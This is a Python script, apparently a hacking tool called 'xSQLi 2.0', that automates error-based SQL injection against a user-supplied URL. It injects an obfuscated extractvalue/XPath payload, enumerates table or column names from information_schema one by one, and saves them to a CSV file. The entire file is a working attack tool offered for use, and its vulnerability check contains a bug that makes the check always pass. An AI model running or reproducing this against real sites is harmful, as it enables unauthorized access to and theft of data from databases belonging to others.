#/!python3
#!/usr/bin/python3

import re,csv,requests

def checkInjection(response):
	print("\n\tChecking...")
	if("your SQL syntax" or "mysql_num_rows()" in response):
		print("\n\t\tSeems Vulnerable,\n\t\t\tLet's Dump \""+dump+"\" From DATABASE Using Xpath Injection Method\n")
	else:
		print("\n\t\tLooks Not Vulnerable!!!\n")
	return

print("""

	██╗  ██╗███████╗ ██████╗ ██╗     ██╗    ██████╗     ██████╗ 
	╚██╗██╔╝██╔════╝██╔═══██╗██║     ██║    ╚════██╗   ██╔═████╗
	 ╚███╔╝ ███████╗██║   ██║██║     ██║     █████╔╝   ██║██╔██║
	 ██╔██╗ ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝    ████╔╝██║
	██╔╝ ██╗███████║╚██████╔╝███████╗██║    ███████╗██╗╚██████╔╝
	╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝╚═╝ ╚═════╝ 
					     
	By #Nittam (@TheNittam)			     @CryptoGenNepal
	https://nirmaldahal.com.np 	      https://CryptoGenNepal
""")

url = input("\n\tEnter URL : ")
dump = input('\tDump (Table | Column), Default: Table: ') or "table"

payload = " and extractvalue(0x3a,concat/*!(0x3a,(/*!00000SelEcT*/ concat/*!("+dump+"_name)*/ /*!from*/ information_schema./**/"+dump+"s where table_schema=database() limit {},1)))-- -"

if re.search(r"[^?]*?=[^?]*",url):

	get = requests.get(url)
	response = get.text
	checkInjection(response)

	x = 0
	while True:
		x += 1
		target = url.replace("inject",payload).format(x)
		get = requests.get(target)

		if(not "XPATH syntax error" in get.text):
			print("""
			   ___                         __
			  / _ \\__ ____ _  ___  ___ ___/ /
			 / // / // /  ' \\/ _ \\/ -_) _  / 
			/____/\\_,_/_/_/_/ .__/\\__/\\_,_/  as ("""+dump+""".csv)
			               /_/               

				""")
			break
		else:
			matches = re.finditer(r"XPATH syntax error\: '\:(.*?)'", get.text, re.MULTILINE)

			for Nittam, match in enumerate(matches, start=1):
				for result in range(0, len(match.groups())):
					result = result + 1
					group = match.group(result)
					print("\t\t\t"+str(x)+")\t=>\t"+group)

					writer = csv.writer(open(dump+'.csv', 'a'))
					writer.writerows([[x,group]])

else:
	print("\n\n\tInvalid Domain Name Or Unsupported Method \"POST\" Detected.\n\tPlease Wait For \"xSQLi.py v3\"  Or Contact whois@cryptogennepal.com")
